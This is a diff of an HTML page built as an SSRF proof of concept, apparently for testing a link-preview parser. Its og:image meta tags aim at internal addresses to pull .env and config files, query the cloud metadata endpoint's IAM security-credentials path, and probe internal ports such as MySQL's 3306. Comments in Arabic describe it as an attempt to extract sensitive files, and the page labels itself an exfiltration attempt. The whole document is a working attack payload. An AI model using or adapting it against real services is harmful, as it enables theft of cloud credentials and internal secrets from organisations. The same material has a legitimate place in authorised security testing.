@@ -1,18 +1,30 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Internal Secret Probe</title>
+    <title>SSRF Internal Scan</title>
 
-    <!-- نحاول سحب محتوى ملف .env من خادم داخلي -->
+    <!-- محاولة سحب ملفات حساسة من خوادم داخلية -->
     <meta property="og:image" content="http://10.0.0.5/.env">
-
-    <!-- نحاول سحب config.json -->
     <meta property="og:image" content="http://10.0.0.5/config.json">
-
-    <!-- نحاول استهداف سيرفر آخر داخلي -->
+    <meta property="og:image" content="http://10.0.0.5/admin/config.php">
     <meta property="og:image" content="http://internal-web-bumba.local/.env">
+
+    <!-- محاولة سحب بيانات من الميتاداتا (إضافة لطلبك السابق) -->
+    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/">
+    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/user-data">
+
+    <!-- محاولة مسح منافذ -->
+    <meta property="og:image" content="http://10.0.0.5:8080/">
+    <meta property="og:image" content="http://10.0.0.5:3306/">
+    <meta property="og:image" content="http://127.0.0.1:5000/health">
+    <meta property="og:image" content="http://internal-api.bumba.local/status">
+
+    <!-- اسم وصف واضح لمساعدتك في تتبع الاستجابة -->
+    <meta name="description" content="SSRF Exfiltration Attempt by Hesham">
   </head>
   <body>
-    <h1>Metadata Test Page</h1>
+    <h1>PoC for SSRF Exfiltration Test</h1>
+    <p>If this page is parsed by the vulnerable endpoint, internal files may be returned.</p>
   </body>
 </html>
